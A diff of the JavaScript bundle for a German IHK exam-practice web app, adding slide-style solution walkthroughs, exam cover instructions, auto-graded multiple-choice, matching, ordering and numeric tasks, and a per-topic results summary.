@@ -338,17 +338,24 @@ AP2.pages = function () {};
       row: (blocks) => blocks.forEach(block),
       exam: (cfg) => {
         emit('note', cfg.hint);
+        (cfg.cover || []).forEach(block);
+        (cfg.intro || []).forEach(block);
         cfg.parts.forEach((part) => {
           title(part.t);
           emit('text', part.intro);
+          (part.ctx || []).forEach(block);
           part.tasks.forEach((task) => {
             (task.ctx || []).forEach(block);
             emit('qa', task.q);
+            if (task.mc) each('qa', task.mc.o);
+            if (task.match) { each('qa', task.match.keys); task.match.items.forEach((it) => emit('qa', it[0])); }
+            if (task.order) task.order.forEach((it) => emit('qa', it[0]));
             answer(task.a);
             inSol(() => (task.sol || []).forEach(block));
           });
         });
       },
+      walk: (cfg) => { emit('fig', cfg.t); (cfg.steps || []).forEach((st) => { emit('text', st.t); (st.b || []).forEach(block); }); },
       see: () => {},
       signs: (items, cap) => { items.forEach((it) => { emit('fig', it[2]); emit('fig', it[3]); }); emit('fig', cap); },
       tool: () => {},
@@ -1555,6 +1562,59 @@ AP2.pages = function () {};
   };
 })();
 ;
+// ui/walk.js
+// Lösungsweg als Präsentation: Folie für Folie mit Zurück/Weiter, Fortschrittspunkten und Pfeiltasten.
+// ['walk', {t: 'Titel', steps: [{t: 'Erklärung (rich)', b: [Blöcke]}, ...]}]
+(function () {
+  const {h, on} = AP2;
+  const S = AP2.S;
+  AP2.blocks.walk = (cfg) => {
+    const steps = cfg.steps || [];
+    let cur = 0;
+    const label = AP2.tint(h('div', {text: cfg.label || 'Lösungsweg Schritt für Schritt', style: {fontSize: S.f.xs, fontWeight: S.fw.bold,
+      textTransform: 'uppercase', letterSpacing: '0.08em'}}), 'accent');
+    const count = AP2.tint(h('div', {style: {fontSize: S.f.sm, fontWeight: S.fw.semi, fontFamily: S.font.mono}}), 'text2');
+    const title = cfg.t ? AP2.tint(h('div', {text: cfg.t, style: {fontSize: S.f.lg, fontWeight: S.fw.bold, margin: S.sp[2] + ' 0 0'}}), 'text') : null;
+    const fill = AP2.fill(h('div', {style: {height: '100%', borderRadius: S.r.pill, transition: 'width 250ms ease'}}), 'accent');
+    const track = AP2.fill(h('div', {style: {height: '4px', borderRadius: S.r.pill, overflow: 'hidden', margin: S.sp[3] + ' 0'}}, [fill]), 'border');
+    const stage = h('div', {style: {minHeight: '120px'}});
+    const dots = h('div', {style: {display: 'flex', flexWrap: 'wrap', gap: '6px', alignItems: 'center'}});
+    const dotEls = steps.map((s, i) => {
+      const d = h('span', {attrs: {title: 'Schritt ' + (i + 1)}, style: {width: '12px', height: '12px', borderRadius: '50%', display: 'inline-block'}});
+      return AP2.press(d, {fn: () => go(i), label: 'Schritt ' + (i + 1),
+        base: (c) => ({backgroundColor: i === cur ? c.accent : i < cur ? c.accentSoft : c.border}), hover: (c) => ({backgroundColor: c.accent})});
+    });
+    dotEls.forEach((d) => dots.appendChild(d));
+    const prev = AP2.btn({text: 'Zurück', small: true, fn: () => go(cur - 1)});
+    const next = AP2.btn({text: 'Weiter', kind: 'primary', small: true, fn: () => go(cur === steps.length - 1 ? 0 : cur + 1)});
+    const nav = h('div', {style: {display: 'flex', justifyContent: 'space-between', alignItems: 'center', gap: S.sp[3], flexWrap: 'wrap', marginTop: S.sp[3]}},
+      [dots, h('div', {style: {display: 'flex', gap: S.sp[2]}}, [prev, next])]);
+    const head = h('div', {style: {display: 'flex', justifyContent: 'space-between', alignItems: 'baseline', gap: S.sp[3]}}, [label, count]);
+    const box = h('div', {attrs: {tabindex: '0'}, style: {padding: '16px 20px', borderRadius: S.r.lg, border: '1px solid', borderTopWidth: '4px', margin: '0 0 ' + S.sp[5], outline: 'none'}},
+      [head, title, track, stage, nav]);
+    AP2.theme.bind(box, (n, c) => { n.style.backgroundColor = c.surface; n.style.borderColor = c.border; n.style.borderTopColor = c.accent; });
+    function go(i) {
+      cur = Math.max(0, Math.min(steps.length - 1, i));
+      AP2.dispose(stage);
+      const step = steps[cur] || {};
+      if (step.t) stage.appendChild(AP2.blocks.p(step.t));
+      if (step.b) stage.appendChild(AP2.renderBlocks(step.b));
+      count.textContent = (cur + 1) + ' / ' + steps.length;
+      fill.style.width = Math.round(((cur + 1) / Math.max(1, steps.length)) * 100) + '%';
+      prev.style.visibility = cur ? 'visible' : 'hidden';
+      next.firstChild.textContent = cur === steps.length - 1 ? 'Von vorn' : 'Weiter';
+      dotEls.forEach((d) => d.repaint && d.repaint());
+    }
+    // Pfeiltasten blättern, wenn der Kasten den Fokus hat; am Ende springt "Weiter" an den Anfang.
+    on(box, 'keydown', (e) => {
+      if (e.key === 'ArrowRight') { e.preventDefault(); go(cur + 1); }
+      if (e.key === 'ArrowLeft') { e.preventDefault(); go(cur - 1); }
+    });
+    go(0);
+    return box;
+  };
+})();
+;
 // ui/render.js
 // Block-Renderer: wandelt [typ, ...argumente]-Listen in DOM um.
 (function () {
@@ -1671,11 +1731,28 @@ AP2.pages = function () {};
   const start = (id, cfg) => { defs[id] = Object.assign({id, parts: []}, cfg); };
   const part = (id, p) => defs[id].parts.push(p);
   const end = (id) => AP2.add(id, [['exam', defs[id]]]);
-  AP2.exam = {GRADES, grade, store, start, part, end};
+  // Bearbeitungshinweise wie auf dem Deckblatt des IHK-Aufgabensatzes (sinngemäß nachgebildet).
+  const COVER = {
+    ps: [['list', ['Der Aufgabensatz enthält **4 Handlungsschritte zu je 25 Punkten**. **Alle** Handlungsschritte sind zu bearbeiten (keine Abwahl).', 'Bearbeitungszeit **90 Minuten**. Erlaubtes Hilfsmittel: netzunabhängiger, nicht programmierbarer Taschenrechner ohne Kommunikationsfunktion.',
+      'Lesen Sie zuerst die **Ausgangssituation** und die **Anlagen**; viele Angaben werden in mehreren Aufgaben gebraucht.', 'Achten Sie auf die **Operatoren**: „nennen“ (Stichworte), „beschreiben“ (zusammenhängend), „erläutern“ (mit Begründung oder Beispiel), „berechnen“ (Rechenweg angeben), „entwerfen/erstellen“ (vollständiges Modell).',
+      'Wird eine bestimmte Anzahl verlangt (z. B. "Nennen Sie drei ..."), werden nur die **ersten** Angaben in dieser Anzahl bewertet.']]],
+    eua: [['list', ['Der Aufgabensatz enthält **4 Handlungsschritte zu je 25 Punkten**. **Alle** Handlungsschritte sind zu bearbeiten.', 'Bearbeitungszeit **90 Minuten**. Erlaubtes Hilfsmittel: nicht programmierbarer Taschenrechner.',
+      'Programmieraufgaben dürfen in **Pseudocode** oder einer **Programmiersprache Ihrer Wahl** (z. B. Java, C#, Python) gelöst werden. Ein Struktogramm oder Aktivitätsdiagramm ist nur zulässig, wenn es ausdrücklich erlaubt ist. Bewertet wird die **Logik**, nicht die exakte Syntax.',
+      'SQL-Aufgaben beziehen sich auf das Datenbankmodell in der **Anlage**. Verwenden Sie Standard-SQL.', 'Die Ergebnistabellen in der Musterlösung beziehen sich auf die Beispieldaten der Anlage.']]],
+    wiso: [['list', ['Bearbeitungszeit **60 Minuten**, **100 Punkte**. Die Aufgaben sind **gebunden**: Sie kreuzen die richtige(n) Antwort(en) an, tragen Kennziffern ein oder geben ein Rechenergebnis ein.', 'Bei Zuordnungs- und Reihenfolgeaufgaben gibt es Punkte **anteilig** je richtiger Zuordnung, sonst nur für die vollständig richtige Lösung.',
+      'Rechenergebnisse ohne Einheit und Tausenderpunkt eingeben (Komma oder Punkt als Dezimaltrennzeichen). Runden Sie wie in der Aufgabe angegeben.', 'Mit **"Prüfung abgeben"** am Ende werden alle Aufgaben auf einmal ausgewertet, wie beim Einlesen des Markierungsbogens.',
+      'Rechtsstand und Werte: **2026**. Gesetzliche Werte, die sich jährlich ändern (Beitragssätze, Grenzen), stehen in der Aufgabe.']]],
+  };
+  AP2.exam = {GRADES, grade, store, start, part, end, COVER};
 })();
 ;
 // ui/examtask.js
 // Eine Prüfungsaufgabe: Aufgabentext, Antwortfeld, Musterlösung und Selbstbewertung.
+// Gebundene Aufgaben (wie in WiSo) werden automatisch bewertet:
+//   mc:    {o: [Optionen], c: [richtige Indizes]}       eine oder mehrere richtige Antworten (alles oder nichts)
+//   match: {keys: [Begriffe], items: [[Aussage, Index]]} Zuordnung, Punkte anteilig
+//   order: [[Schritt, Rang], ...]                         Reihenfolge (Rang ab 1), Punkte anteilig
+//   num:   {c: Zahl, tol: Toleranz, unit: 'Euro'}         Rechenergebnis
 (function () {
   const {h, on} = AP2;
   const S = AP2.S;
@@ -1684,6 +1761,9 @@ AP2.pages = function () {};
     const el = h('span', {text: pts + (pts === 1 ? ' Punkt' : ' Punkte'), style: {fontSize: S.f.xs, padding: '2px 10px', borderRadius: S.r.pill, border: '1px solid'}});
     return AP2.theme.bind(el, (n, c) => { n.style.color = c.text2; n.style.borderColor = c.border; });
   };
+  const LETTERS = 'abcdefghijklmnop';
+  const bound = (task) => (task.mc ? 'mc' : task.match ? 'match' : task.order ? 'order' : task.num ? 'num' : null);
+  AP2.examBound = bound;
   const gradeRow = (task, store, key, onPts) => {
     const opts = Array.from({length: task.pts + 1}, (_, n) => h('option', {text: String(n), attrs: {value: String(n)}}));
     const select = AP2.field(h('select', {attrs: {'aria-label': 'Erreichte Punkte'}}, opts));
@@ -1692,27 +1772,130 @@ AP2.pages = function () {};
     const text = AP2.tint(h('span', {text: 'Eigene Bewertung: erreichte Punkte von ' + task.pts, style: {fontSize: S.f.sm, fontWeight: S.fw.med}}), 'text');
     return h('div', {style: {display: 'flex', alignItems: 'center', gap: S.sp[3], flexWrap: 'wrap', margin: '0 0 ' + S.sp[4]}}, [text, select]);
   };
-  const solution = (task, store, key, onPts) => {
+  const solution = (task, store, key, onPts, auto) => {
     const body = h('div', {style: {display: 'none', padding: '16px 20px 6px', borderRadius: S.r.md, marginTop: S.sp[4], borderLeft: '4px solid'}},
-      [tag('Musterlösung', 'ok'), AP2.answerNodes(task.a), task.sol ? AP2.renderBlocks(task.sol) : null, gradeRow(task, store, key, onPts)]);
+      [tag(auto ? 'Lösung und Erklärung' : 'Musterlösung', 'ok'), auto ? auto.result : null, task.a ? AP2.answerNodes(task.a) : null, task.sol ? AP2.renderBlocks(task.sol) : null,
+        task.see ? AP2.blocks.see(task.see, 'Nachlernen') : null, auto ? null : gradeRow(task, store, key, onPts)]);
     return AP2.theme.bind(body, (n, c) => { n.style.backgroundColor = c.surface2; n.style.borderLeftColor = c.ok; });
   };
+  const readJson = (store, key, fallback) => { try { return JSON.parse(store.ans(key)) || fallback; } catch (e) { return fallback; } };
+  const numVal = (txt) => Number(String(txt).replace(/\s|€|%/g, '').replace(/\.(?=\d{3}(\D|$))/g, '').replace(',', '.'));
+  // Eingabefelder und Auswertung je Art. Liefert {el, score(), mark()}.
+  const inputs = {
+    mc: (task, store, key) => {
+      const multi = task.mc.c.length > 1;
+      const paintRow = (n, c) => { const res = n.dataset.res; n.style.borderColor = res === 'ok' ? c.ok : res === 'bad' ? c.bad : c.border;
+        n.style.backgroundColor = res === 'ok' ? c.okSoft : res === 'bad' ? c.badSoft : c.surface; };
+      let picked = readJson(store, key, []);
+      const rows = task.mc.o.map((txt, i) => {
+        const box = h('input', {attrs: {type: multi ? 'checkbox' : 'radio', name: 'mc' + key, 'aria-label': 'Antwort ' + (i + 1)}});
+        box.checked = picked.includes(i);
+        on(box, 'change', () => {
+          picked = multi ? (box.checked ? picked.concat(i) : picked.filter((x) => x !== i)) : [i];
+          store.setAns(key, JSON.stringify(picked));
+        });
+        const nr = AP2.tint(h('span', {text: String(i + 1), style: {fontFamily: S.font.mono, fontWeight: S.fw.bold, minWidth: '18px'}}), 'text2');
+        const row = h('label', {style: {display: 'flex', gap: S.sp[3], alignItems: 'flex-start', padding: '8px 12px', borderRadius: S.r.sm, border: '1px solid', cursor: 'pointer', marginBottom: '6px'}},
+          [box, nr, AP2.tint(h('span', {style: {lineHeight: S.lh.body}}, AP2.rich(txt)), 'text')]);
+        AP2.theme.bind(row, paintRow);
+        return row;
+      });
+      const hint = AP2.tint(h('div', {text: multi ? 'Kreuzen Sie ' + task.mc.c.length + ' richtige Antworten an.' : 'Kreuzen Sie die richtige Antwort an.', style: {fontSize: S.f.sm, marginBottom: S.sp[2]}}), 'text2');
+      return {
+        el: h('div', {}, [hint].concat(rows)),
+        score: () => (picked.length === task.mc.c.length && task.mc.c.every((x) => picked.includes(x)) ? task.pts : 0),
+        mark: () => rows.forEach((row, i) => { row.dataset.res = task.mc.c.includes(i) ? 'ok' : picked.includes(i) ? 'bad' : ''; AP2.theme.bind(row, paintRow); }),
+      };
+    },
+    match: (task, store, key) => {
+      const keys = task.order ? task.order.map((_, i) => String(i + 1)) : task.match.keys;
+      const items = task.order ? task.order : task.match.items;
+      const solutionOf = (it) => (task.order ? it[1] - 1 : it[1]);
+      let picked = readJson(store, key, {});
+      const legend = task.order ? null : h('div', {style: {display: 'flex', flexWrap: 'wrap', gap: S.sp[2], margin: '0 0 ' + S.sp[3]}}, keys.map((k, i) => {
+        const chip = h('span', {style: {padding: '4px 10px', borderRadius: S.r.sm, fontSize: S.f.sm, border: '1px solid'}}, [h('b', {text: (i + 1) + '  '}), AP2.rich(k)]);
+        return AP2.theme.bind(chip, (n, c) => { n.style.borderColor = c.border; n.style.backgroundColor = c.surface2; n.style.color = c.text; });
+      }));
+      const rows = items.map((it, i) => {
+        const sel = AP2.field(h('select', {attrs: {'aria-label': 'Zuordnung ' + LETTERS[i]}, style: {padding: '6px 8px', minWidth: '64px'}},
+          [h('option', {text: '–', attrs: {value: ''}})].concat(keys.map((k, ki) => h('option', {text: String(ki + 1), attrs: {value: String(ki)}})))));
+        sel.value = picked[i] === undefined ? '' : String(picked[i]);
+        on(sel, 'change', () => { picked = Object.assign({}, picked, {[i]: sel.value === '' ? undefined : Number(sel.value)}); store.setAns(key, JSON.stringify(picked)); });
+        const res = h('span', {style: {fontSize: S.f.sm, fontWeight: S.fw.semi, minWidth: '40px'}});
+        const row = h('div', {style: {display: 'flex', gap: S.sp[3], alignItems: 'center', padding: '6px 0', borderBottom: '1px solid'}},
+          [sel, AP2.tint(h('span', {style: {flex: '1 1 0', lineHeight: S.lh.body}}, [h('b', {text: LETTERS[i] + ')  '}), AP2.rich(it[0])]), 'text'), res]);
+        AP2.theme.bind(row, (n, c) => { n.style.borderColor = c.border; });
+        return {row, sel, res, want: solutionOf(it)};
+      });
+      const hint = AP2.tint(h('div', {text: task.order ? 'Tragen Sie die Reihenfolge ein (1 = zuerst).' : 'Tragen Sie die Kennziffer des passenden Begriffs ein. Begriffe können mehrfach oder gar nicht vorkommen.', style: {fontSize: S.f.sm, marginBottom: S.sp[2]}}), 'text2');
+      const right = () => rows.filter((r, i) => picked[i] === r.want).length;
+      return {
+        el: h('div', {}, [hint, legend].concat(rows.map((r) => r.row))),
+        score: () => Math.floor((task.pts * right()) / rows.length + 1e-9),
+        mark: () => rows.forEach((r, i) => {
+          const ok = picked[i] === r.want;
+          r.res.textContent = ok ? 'richtig' : '→ ' + (r.want + 1);
+          AP2.tint(r.res, ok ? 'ok' : 'bad');
+        }),
+      };
+    },
+    num: (task, store, key) => {
+      const field = AP2.field(h('input', {attrs: {type: 'text', inputmode: 'decimal', 'aria-label': 'Ergebnis', placeholder: 'Ergebnis'}, style: {width: '180px', fontFamily: S.font.mono}}));
+      field.value = store.ans(key);
+      on(field, 'input', () => store.setAns(key, field.value));
+      const res = h('span', {style: {fontSize: S.f.sm, fontWeight: S.fw.semi}});
+      const unit = AP2.tint(h('span', {text: task.num.unit || '', style: {fontSize: S.f.md}}), 'text2');
+      const ok = () => Math.abs(numVal(field.value) - task.num.c) <= (task.num.tol === undefined ? 0.005 : task.num.tol);
+      const work = AP2.field(h('textarea', {attrs: {rows: 2, placeholder: 'Rechenweg (optional) ...', 'aria-label': 'Rechenweg'}, style: {width: '100%', display: 'block', marginTop: S.sp[2], resize: 'vertical'}}));
+      work.value = store.ans(key + 'w');
+      on(work, 'input', () => store.setAns(key + 'w', work.value));
+      return {
+        el: h('div', {}, [h('div', {style: {display: 'flex', alignItems: 'center', gap: S.sp[3], flexWrap: 'wrap'}}, [field, unit, res]), work]),
+        score: () => (field.value.trim() && ok() ? task.pts : 0),
+        mark: () => { res.textContent = ok() ? 'richtig' : 'richtig wäre: ' + String(task.num.c).replace('.', ',') + ' ' + (task.num.unit || ''); AP2.tint(res, ok() ? 'ok' : 'bad'); },
+      };
+    },
+  };
+  inputs.order = inputs.match;
   AP2.examTask = (task, num, store, key, onPts) => {
-    const head = h('div', {style: {display: 'flex', justifyContent: 'space-between', alignItems: 'center', gap: S.sp[3], marginBottom: S.sp[3]}}, [tag('Aufgabe ' + num, 'accent'), pill(task.pts)]);
+    const kind = bound(task);
+    const head = h('div', {style: {display: 'flex', justifyContent: 'space-between', alignItems: 'center', gap: S.sp[3], marginBottom: S.sp[3]}},
+      [h('div', {style: {display: 'flex', gap: S.sp[3], alignItems: 'center'}}, [tag('Aufgabe ' + num, 'accent'), task.topic ? tag(task.topic, 'text3') : null]), pill(task.pts)]);
     const ctx = task.ctx ? h('div', {}, [AP2.renderBlocks(task.ctx)]) : null;
     const q = AP2.tint(h('div', {style: {fontSize: S.f.md, fontWeight: S.fw.semi, lineHeight: S.lh.body, margin: '0 0 ' + S.sp[3]}}, [AP2.rich(task.q)]), 'text');
-    const area = AP2.field(h('textarea', {attrs: {rows: task.rows || 5, 'aria-label': 'Antwort zu Aufgabe ' + num, placeholder: 'Deine Antwort ...'},
-      style: {width: '100%', display: 'block', resize: 'vertical', lineHeight: S.lh.body}}));
-    area.value = store.ans(key);
-    on(area, 'input', () => store.setAns(key, area.value));
-    const sol = solution(task, store, key, onPts);
-    const toggle = AP2.btn({text: 'Musterlösung anzeigen', small: true, fn: () => {
+    let answer;
+    let auto = null;
+    if (kind) {
+      answer = inputs[kind](task, store, key);
+      const result = h('div', {style: {fontSize: S.f.md, fontWeight: S.fw.bold, margin: S.sp[2] + ' 0 ' + S.sp[3]}});
+      auto = {result};
+    } else {
+      answer = {el: AP2.field(h('textarea', {attrs: {rows: task.rows || 5, 'aria-label': 'Antwort zu Aufgabe ' + num, placeholder: 'Deine Antwort ...'},
+        style: {width: '100%', display: 'block', resize: 'vertical', lineHeight: S.lh.body}}))};
+      answer.el.value = store.ans(key);
+      on(answer.el, 'input', () => store.setAns(key, answer.el.value));
+    }
+    const sol = solution(task, store, key, onPts, auto);
+    const check = () => {
+      const got = answer.score();
+      answer.mark();
+      auto.result.textContent = 'Automatisch bewertet: ' + got + ' von ' + task.pts + (task.pts === 1 ? ' Punkt' : ' Punkten');
+      AP2.tint(auto.result, got === task.pts ? 'ok' : got ? 'gold' : 'bad');
+      store.setPts(key, got);
+      AP2.game.examPoints(store.id, key, got);
+      onPts();
+    };
+    const label = kind ? 'Auswerten' : 'Musterlösung anzeigen';
+    const toggle = AP2.btn({text: label, small: true, kind: kind ? 'primary' : 'soft', fn: () => {
+      if (kind) { check(); sol.style.display = 'block'; toggle.firstChild.textContent = 'Erneut auswerten'; return; }
       const open = sol.style.display === 'none';
       sol.style.display = open ? 'block' : 'none';
       toggle.firstChild.textContent = open ? 'Musterlösung ausblenden' : 'Musterlösung anzeigen';
     }});
-    sol.ap2Reveal = () => { if (sol.style.display === 'none') toggle.click(); };
-    const card = h('div', {style: {padding: '18px 20px', borderRadius: S.r.md, border: '1px solid', margin: '0 0 ' + S.sp[4]}}, [head, ctx, q, area, h('div', {style: {marginTop: S.sp[3]}}, [toggle]), sol]);
+    // Suchtreffer in der Lösung: bei gebundenen Aufgaben nur aufklappen, nicht bewerten.
+    sol.ap2Reveal = () => { if (kind) sol.style.display = 'block'; else if (sol.style.display === 'none') toggle.click(); };
+    const card = h('div', {style: {padding: '18px 20px', borderRadius: S.r.md, border: '1px solid', margin: '0 0 ' + S.sp[4]}}, [head, ctx, q, answer.el, h('div', {style: {marginTop: S.sp[3]}}, [toggle]), sol]);
+    card.ap2Check = kind ? () => { check(); sol.style.display = 'block'; toggle.firstChild.textContent = 'Erneut auswerten'; } : null;
     return AP2.theme.bind(card, (n, c) => { n.style.backgroundColor = c.surface; n.style.borderColor = c.border; });
   };
 })();
@@ -1762,16 +1945,60 @@ AP2.pages = function () {};
 })();
 ;
 // ui/exam.js
-// Block "exam": komplette Probeprüfung mit Handlungsschritten, Aufgaben, Zeitlimit und Auswertung.
+// Block "exam": komplette Probeprüfung mit Deckblatt, Handlungsschritten, Aufgaben, Zeitlimit und Auswertung nach Themen.
 (function () {
   const {h} = AP2;
   const S = AP2.S;
   const sumPts = (list) => list.reduce((a, t) => a + t.pts, 0);
+  const card = (kids, accent) => {
+    const el = h('div', {style: {padding: '18px 20px', borderRadius: S.r.md, border: '1px solid', borderLeftWidth: accent ? '5px' : '1px', margin: '0 0 ' + S.sp[5]}}, kids);
+    return AP2.theme.bind(el, (n, c) => { n.style.backgroundColor = c.surface; n.style.borderColor = c.border; if (accent) n.style.borderLeftColor = c.accent; });
+  };
+  const label = (txt) => AP2.tint(h('div', {text: txt, style: {fontSize: S.f.xs, fontWeight: S.fw.bold, textTransform: 'uppercase', letterSpacing: '0.08em', marginBottom: S.sp[2]}}), 'accent');
+  const meter = (pct) => {
+    const fill = AP2.theme.bind(h('div', {style: {height: '100%', width: Math.round(pct) + '%', borderRadius: S.r.pill}}),
+      (n, c) => { n.style.backgroundColor = pct >= 67 ? c.ok : pct >= 50 ? c.gold : c.bad; });
+    return AP2.fill(h('div', {style: {height: '6px', borderRadius: S.r.pill, overflow: 'hidden', flex: '1 1 120px'}}, [fill]), 'border');
+  };
+  // Auswertung: Punkte je Handlungsschritt und Themen mit Punktverlust (aus task.see) zum gezielten Nachlernen.
+  const summary = (cfg, store) => {
+    const body = h('div');
+    const el = card([label('Auswertung'), body], true);
+    const update = () => {
+      AP2.dispose(body);
+      let graded = 0;
+      let count = 0;
+      const weak = {};
+      cfg.parts.forEach((part, pi) => {
+        let got = 0;
+        part.tasks.forEach((t, ti) => {
+          count++;
+          const p = store.pts(pi + '.' + ti);
+          if (p === undefined) return;
+          graded++;
+          got += p;
+          if (p < t.pts) (t.see || []).forEach((id) => { weak[id] = (weak[id] || 0) + (t.pts - p); });
+        });
+        const max = sumPts(part.tasks);
+        const name = AP2.tint(h('div', {text: part.t.replace(/\s*\(\d+ Punkte\)\s*$/, ''), style: {fontSize: S.f.sm, flex: '2 1 240px'}}), 'text');
+        const val = AP2.tint(h('div', {text: got + ' / ' + max, style: {fontSize: S.f.sm, fontFamily: S.font.mono, minWidth: '64px', textAlign: 'right'}}), 'text2');
+        body.appendChild(h('div', {style: {display: 'flex', alignItems: 'center', gap: S.sp[3], flexWrap: 'wrap', padding: '6px 0'}}, [name, meter(max ? (got / max) * 100 : 0), val]));
+      });
+      const info = AP2.tint(h('div', {text: graded + ' von ' + count + ' Aufgaben bewertet.', style: {fontSize: S.f.sm, margin: S.sp[3] + ' 0'}}), 'text2');
+      body.appendChild(info);
+      const ids = Object.keys(weak).sort((a, b) => weak[b] - weak[a]);
+      if (ids.length) body.appendChild(AP2.blocks.see(ids, 'Nachlernen (sortiert nach verlorenen Punkten)'));
+      else if (graded) body.appendChild(AP2.tint(h('div', {text: 'Bisher keine Punktverluste mit Themenzuordnung.', style: {fontSize: S.f.sm}}), 'ok'));
+    };
+    return {el, update};
+  };
   AP2.blocks.exam = (cfg) => {
     const store = AP2.exam.store(cfg.id);
     const total = cfg.parts.reduce((a, part) => a + sumPts(part.tasks), 0);
     const bar = AP2.examBar(cfg, store);
     const labels = [];
+    const cards = [];
+    const sum = summary(cfg, store);
     const update = () => {
       let all = 0;
       cfg.parts.forEach((part, pi) => {
@@ -1780,15 +2007,34 @@ AP2.pages = function () {};
         all += got;
       });
       bar.update(all, total);
+      sum.update();
     };
-    const root = h('div', {}, [AP2.blocks.note(cfg.hint), bar.el]);
+    const root = h('div', {}, [cfg.hint ? AP2.blocks.note(cfg.hint) : null]);
+    // Deckblatt (Bearbeitungshinweise) und Ausgangssituation mit Anlagen, wie im Aufgabensatz der IHK.
+    if (cfg.cover) root.appendChild(card([label('Bearbeitungshinweise'), AP2.renderBlocks(cfg.cover)]));
+    if (cfg.intro) root.appendChild(card([label('Ausgangssituation'), AP2.renderBlocks(cfg.intro)], true));
+    root.appendChild(bar.el);
     cfg.parts.forEach((part, pi) => {
-      const label = AP2.tint(h('span', {style: {fontSize: S.f.sm, fontWeight: S.fw.semi}}), 'text2');
-      labels.push(label);
-      root.appendChild(h('div', {style: {display: 'flex', justifyContent: 'space-between', alignItems: 'baseline', gap: S.sp[3], flexWrap: 'wrap'}}, [AP2.blocks.h(part.t), label]));
+      const lab = AP2.tint(h('span', {style: {fontSize: S.f.sm, fontWeight: S.fw.semi}}), 'text2');
+      labels.push(lab);
+      root.appendChild(h('div', {style: {display: 'flex', justifyContent: 'space-between', alignItems: 'baseline', gap: S.sp[3], flexWrap: 'wrap'}}, [AP2.blocks.h(part.t), lab]));
       if (part.intro) root.appendChild(AP2.blocks.p(part.intro));
-      part.tasks.forEach((task, ti) => root.appendChild(AP2.examTask(task, (pi + 1) + '.' + (ti + 1), store, pi + '.' + ti, update)));
+      if (part.ctx) root.appendChild(AP2.renderBlocks(part.ctx));
+      part.tasks.forEach((task, ti) => {
+        const el = AP2.examTask(task, (pi + 1) + '.' + (ti + 1), store, pi + '.' + ti, update);
+        cards.push(el);
+        root.appendChild(el);
+      });
     });
+    // Gebundene Aufgaben auf einmal auswerten (wie die Abgabe des Markierungsbogens).
+    const auto = cards.filter((c) => c.ap2Check);
+    if (auto.length) {
+      const all = AP2.btn({text: 'Prüfung abgeben: alle ' + auto.length + ' gebundenen Aufgaben auswerten', kind: 'primary', fn: () => {
+        if (window.confirm('Alle gebundenen Aufgaben jetzt auswerten?')) auto.forEach((c) => c.ap2Check());
+      }});
+      root.appendChild(h('div', {style: {margin: S.sp[4] + ' 0 ' + S.sp[5]}}, [all]));
+    }
+    root.appendChild(sum.el);
     update();
     return root;
   };
@@ -3314,6 +3560,8 @@ AP2.pages = function () {};
     oval: (n) => [{tag: 'ellipse', a: {cx: n.x, cy: n.y, rx: n.w / 2, ry: n.h / 2}}],
     circle: (n) => [{tag: 'ellipse', a: {cx: n.x, cy: n.y, rx: n.w / 2, ry: n.h / 2}}],
     diamond: (n) => { const e = edges(n); return poly([[n.x, e.t], [e.r, n.y], [n.x, e.b], [e.l, n.y]]); },
+    // Sechseck (EPK-Ereignis).
+    hex: (n) => { const e = edges(n); const d = Math.min(18, n.w / 6); return poly([[e.l + d, e.t], [e.r - d, e.t], [e.r, n.y], [e.r - d, e.b], [e.l + d, e.b], [e.l, n.y]]); },
     para: (n) => { const e = edges(n); return poly([[e.l + 14, e.t], [e.r, e.t], [e.r - 14, e.b], [e.l, e.b]]); },
     proc2: (n) => { const e = edges(n); return rect(n, 2).concat([path('M' + (e.l + 10) + ' ' + e.t + 'V' + e.b + 'M' + (e.r - 10) + ' ' + e.t + 'V' + e.b, {s: 'line', f: null, sw: 1.5})]); },
     note: (n) => { const e = edges(n); return poly([[e.l, e.t], [e.r - 12, e.t], [e.r, e.t + 12], [e.r, e.b], [e.l, e.b]]); },
@@ -3473,7 +3721,7 @@ AP2.pages = function () {};
   };
   // Nutzbare Textbreite je Form; Formen ohne Rahmen (Text, Akteur, Punkt) begrenzen ihren Text nur über n.mw.
   const FREE = ['text', 'actor', 'dot', 'ring', 'bar'];
-  const INNER = {diamond: (w) => w * 0.62, oval: (w) => w * 0.82, circle: (w) => w * 0.82, para: (w) => w - 34, proc2: (w) => w - 28, cyl: (w) => w - 12};
+  const INNER = {diamond: (w) => w * 0.62, oval: (w) => w * 0.82, circle: (w) => w * 0.82, para: (w) => w - 34, hex: (w) => w - 30, proc2: (w) => w - 28, cyl: (w) => w - 12};
   const room = (n) => (FREE.includes(n.k) ? n.mw || 0 : (INNER[n.k] || ((w) => w - 12))(n.w));
   // Zu lange Beschriftungen werden umbrochen und verkleinert, damit sie in ihrer Form bleiben.
   const fit = (n, lines) => {
@@ -3537,18 +3785,15 @@ AP2.pages = function () {};
     if (cfg.keep) keepWidth(box, root, cfg.keep);
     return AP2.theme.bind(box, (n, c) => { n.style.backgroundColor = c.surface; n.style.borderColor = c.border; });
   };
-  // Breite Diagramme: nie schmaler als "keep" Pixel, darunter scrollt der Rahmen.
+  // Breite Diagramme: nie schmaler als "keep" Pixel, darunter scrollt der Rahmen (auch in schmalen Lösungskästen).
   const keepWidth = (box, root, keep) => {
     box.style.overflowX = 'auto';
-    let seen = false;
-    const off = AP2.layout.bind((L) => {
-      if (box.isConnected) seen = true; else if (seen) { off(); return; }
-      root.style.width = Math.max(keep, L.contentW - 2 * (S.sp[3] + 1)) + 'px';
-    });
+    root.style.minWidth = keep + 'px';
   };
   AP2.blocks.diagram = (cfg) => {
     const root = svg('svg', {viewBox: '0 0 ' + cfg.w + ' ' + cfg.h, role: 'img', 'aria-label': cfg.cap || 'Diagramm'});
-    st(root, {width: '100%', height: 'auto', display: 'block', fontFamily: S.font.sans});
+    // Kleine Diagramme nicht über ihre natürliche Größe hinaus aufblähen.
+    st(root, {width: '100%', maxWidth: Math.round(cfg.w * 1.25) + 'px', margin: '0 auto', height: 'auto', display: 'block', fontFamily: S.font.sans});
     const paint = AP2.paint(root);
     const nodes = {};
     (cfg.nodes || []).forEach((n) => { prep(n); nodes[n.id] = n; });
@@ -3648,7 +3893,7 @@ AP2.pages = function () {};
     for (let t = 0; t <= total; t += opt.tick || 1) {
       const x = left + t * unit;
       edges.push({a: [x, 30], b: [x, h - 8], ea: 'none', s: 'border', w: 1});
-      nodes.push({id: 'tk' + t, k: 'text', x, y: 16, t: String(t), fs: 11, tc: 'text3', w: 20, h: 14});
